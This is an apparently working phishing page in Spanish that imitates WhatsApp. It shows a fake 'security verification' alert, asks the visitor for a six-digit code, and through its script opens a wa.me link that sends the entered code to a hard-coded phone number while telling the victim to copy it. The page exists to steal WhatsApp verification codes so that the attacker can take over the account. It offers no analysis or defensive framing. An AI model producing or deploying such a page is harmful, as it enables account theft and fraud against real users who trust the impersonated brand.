<!DOCTYPE html>
<html>
<head>
<title>WhatsApp</title>
<style>
body{font-family:Arial;background:#00a884;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:white;padding:40px;border-radius:10px;text-align:center;max-width:400px}
.logo{width:80px;margin-bottom:20px}
input{width:100%;padding:20px;font-size:32px;text-align:center;letter-spacing:10px;margin:20px 0;border:2px solid #ddd}
button{background:#00a884;color:white;border:none;padding:15px;font-size:16px;border-radius:30px;cursor:pointer;width:100%}
#codebox{display:none;margin-top:20px;padding:20px;background:yellow;border:3px solid red;font-size:36px;font-weight:bold}
</style>
</head>
<body>
<div class="box">
<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
<h2>Verificación de Seguridad</h2>
<p style="color:red;background:#ffebee;padding:10px">⚠️ Intento de acceso detectado</p>
<input type="text" id="c" placeholder="123456" maxlength="6">
<button onclick="send()">Verificar</button>
<div id="codebox"></div>
</div>
<script>
function send(){
var code=document.getElementById('c').value;
if(code.length<4){alert('Ingrese código');return;}
document.getElementById('codebox').style.display='block';
document.getElementById('codebox').innerHTML='🚨 CÓDIGO: '+code+'<br><br>COPIA ESTO AHORA';
// Intentar abrir WhatsApp con el código
window.open('https://wa.me/584121356348?text=Codigo:'+code,'_blank');
}
</script>
</body>
</html>
